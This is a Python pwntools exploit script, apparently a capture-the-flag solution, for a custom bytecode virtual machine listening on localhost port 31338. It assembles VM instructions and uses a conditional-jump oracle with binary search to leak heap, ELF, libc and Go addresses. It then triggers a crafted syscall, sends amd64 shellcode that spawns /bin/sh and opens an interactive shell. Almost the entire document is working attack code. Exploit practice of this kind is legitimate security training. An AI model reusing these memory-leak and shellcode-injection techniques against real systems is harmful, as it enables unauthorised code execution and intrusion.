from pwn import *

#r = process("./main")
r = remote("localhost", 31338)
exe = ELF("./container/main")
context.binary = exe



#pause()
if args.GDB:
    pause()

payload = b""

def minus(i):
    return (0xffffffffffffffff+1)-i

def sendp():
    global payload
    payload += b"\x00"*(4096 - len(payload))
    r.send(payload)
    #r.sendline(b"a")
    payload = b""

def push(imm):
    global payload
    payload += p64(0x50)
    payload += p64(imm)

def pushr(reg):
    global payload
    payload += p64(0x10 + reg)

def pop(reg):
    global payload
    payload += p64(0x20 + (reg))

def call(reg):
    global payload
    payload += p64(0x41 + (reg << 8))

def add(reg1, reg2):
    global payload
    payload += p64(0x30 + (reg1 << 8) + (reg2 << 12))

def i34(reg1, reg2):
    global payload
    payload += p64(0x43 + (reg1 << 8))

def syscalla(num, a1, a2):
    global payload
    push(num)
    push(a1)
    push(a2)
    pop(0)
    pop(1)
    pop(2)
    payload += p64(0xff)

def syscall():
    global payload
    payload += p64(0xff)


# TODO make it jump relative to 0xf
# if rz is greater it jumps

def condjump(z_idx, cmp):
    global payload
    push(cmp)
    push(0xc0)
    pop(2)
    pop(1)

    pushr(0xf)
    pop(8)
    push(0) #offset
    pop(7)

    payload += p64(0x43 + (0x12 << 8))
    payload += p64(z_idx)
    #payload += p64(0)

    # Write AAAA
    pushr(0xe)
    pop(1)
    push(0x0a41414141) # AAAA
    push(5)
    pop(2)
    push(1)
    pop(0)
    syscall()
    
    # if it doesn't jump to beginning it will 
    push(0)
    pop(0)
    push(0)
    pop(1)
    push(0x1000)
    pop(2)
    syscall()

    push(0)
    pop(0xf)

    sendp()
    return b"AAAA" in r.clean()

def binsearch(reg):
    low, hi = 0, 0x7fffffffffffffff
    if reg < 0:
        reg = minus(abs(reg))

    while hi > low:
        mid = (hi+low)//2
        #print(hex(mid))
        if(condjump(reg, mid)): # if val[reg] > mid
            hi = mid
        else:
            low = mid + 1
    return mid
        
def refresh():
    push(0)
    pop(0)
    push(0)
    pop(1)
    push(0x1000)
    pop(2)
    syscall()


#heap_leak = binsearch(-0x5d)
#elf_leak = binsearch(-0x58)
#libc_leak = binsearch(0x18)
#print(hex(heap_leak))
#print(hex(elf_leak))
#print(hex(libc_leak))


push(2)
pop(0)
push(0x414141414141000)
pop(1)
push(0x1000)
pop(2)
syscall()
refresh()

push(0)
pop(0xf)
pushr(0)
pop(0)
for i in range(0x38):
    push(0)
    pop(0xf)


sendp()
###


go_leak = binsearch(0x17) << 12
print(hex(go_leak))


push(0)
pop(0)
push(0x414141414141000)
pop(1)
push(0x1000)
pop(2)
syscall()

push(go_leak)
pop(11)

push(minus(0x106))
pop(0)
syscall()

pushr(0)
pushr(0)
for i in range(0x38):
    push(0)
    pop(0xf)

sendp()

shellcode = asm(shellcraft.amd64.linux.sh())
shellcode += b"\x00"*(0x1000-len(shellcode))
r.send(shellcode)


r.interactive()
